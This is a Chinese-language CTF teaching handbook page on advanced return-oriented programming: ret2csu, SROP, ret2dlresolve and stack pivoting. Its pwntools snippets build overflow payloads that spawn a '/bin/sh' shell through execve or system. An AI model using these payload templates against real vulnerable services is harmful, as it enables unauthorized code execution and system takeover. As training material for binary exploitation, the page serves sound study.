---
title: ROP 进阶
order: 6
icon: akar-icons:link-chain
category:
  - CTF
  - 手册
  - Pwn
---

掌握基础 ROP 后，本节介绍几种进阶技术：ret2csu、SROP 和 ret2dlresolve。

## ret2csu

`__libc_csu_init` 是 glibc 中几乎所有 64 位程序都有的函数，其中包含两段非常有用的 gadget，可以控制 rbx、rbp、r12、r13、r14、r15 以及 rdi、rsi、rdx。

### 找 csu gadget

```python
from pwn import *

elf = ELF('./vuln')
# 在 IDA 中找 __libc_csu_init，或者
csu_init = elf.symbols['__libc_csu_init']

# gadget1（高地址）：
# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# gadget2（低地址，在 gadget1 前面约 0x1a 字节）：
# mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]
```

### 利用方式

```python
from pwn import *

elf = ELF('./vuln')
csu_gadget1 = elf.symbols['__libc_csu_init'] + 0x5a  # 实际偏移需调试确认
csu_gadget2 = elf.symbols['__libc_csu_init'] + 0x40

def csu_call(func_got, arg1=0, arg2=0, arg3=0):
    """用 csu gadget 调用函数，控制三个参数"""
    payload = b''
    # gadget2: 设置参数
    payload += p64(csu_gadget2)
    payload += p64(0)           # rbx = 0
    payload += p64(1)           # rbp = 1（让 cmp 通过）
    payload += p64(func_got)    # r12 = 函数 GOT 地址
    payload += p64(arg1)        # r13 → edi（第1参数；mov edi, r13d 是 32 位写，地址要能放进低 32 位）
    payload += p64(arg2)        # r14 → rsi（第2参数）
    payload += p64(arg3)        # r15 → rdx（第3参数）
    # 调用返回后，gadget2 还有收尾指令：
    # add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    payload += p64(0)           # 被 add rsp, 8 跳过
    payload += p64(0) * 6       # 被 6 个 pop 弹出
    # 调用方在返回值后继续拼接的 8 字节，就是 ret 的跳转地址
    return payload
```

## SROP（Sigreturn Oriented Programming）

利用 `sigreturn` 系统调用，一次性设置所有寄存器的值。

### 原理

`sigreturn` 系统调用会从栈上恢复一个 `sigcontext` 结构体到所有寄存器，包括 rip、rsp、rdi、rsi、rdx 等。

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 构造 SigreturnFrame
frame = SigreturnFrame()
frame.rax = 59          # execve 系统调用号
frame.rdi = bin_sh_addr # 第一个参数："/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr  # 执行 syscall 指令

# 触发 sigreturn
# 需要：rax = 15（sigreturn 系统调用号）+ syscall 指令
payload = b'A' * offset
payload += p64(syscall_addr)  # 执行 syscall（触发 sigreturn）
payload += bytes(frame)       # sigcontext 结构体
```

### 适用场景

- 程序中只有 `syscall` 指令，没有足够的 gadget
- 可以控制 rax = 15（sigreturn 系统调用号）

## ret2dlresolve

利用动态链接的延迟绑定机制，伪造符号解析过程，让程序调用任意 libc 函数。

```python
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# pwntools 自动化 ret2dlresolve
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

# 构造 payload
rop = ROP(elf)
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
rop.ret2dlresolve(dlresolve)

payload = b'A' * offset + rop.chain()
p.sendline(payload)
p.sendline(dlresolve.payload)
p.interactive()
```

## 栈迁移（Stack Pivoting）

当溢出空间不足以放下完整 ROP 链时，用 `leave; ret` gadget 把栈迁移到其他地方。

```python
# leave = mov rsp, rbp; pop rbp
# 通过控制 rbp，可以把 rsp 迁移到任意地址

# 在 bss 段或堆上布置 ROP 链
fake_stack = elf.bss() + 0x100
rop_chain = p64(pop_rdi) + p64(bin_sh) + p64(system)

# 先把 ROP 链写到 fake_stack
# 然后用 leave; ret 迁移栈
payload = b'A' * (offset - 8)
payload += p64(fake_stack)   # 覆盖 rbp
payload += p64(leave_ret)    # 触发栈迁移
```

::: note 课后练习
课后练习需要你连接校园网才能访问内网练习平台。
:::

## 课后练习

- [ROP 链拼图](http://172.16.173.140/training/11?challenge=52) — 开了 NX，没有 shellcode 可用，用 gadget 拼出 ROP 链

## 练手资源

- CTFHub Pwn 进阶系列
- 攻防世界 Pwn 高级题
- [ROP Emporium](https://ropemporium.com/) — 专门练习 ROP 的平台
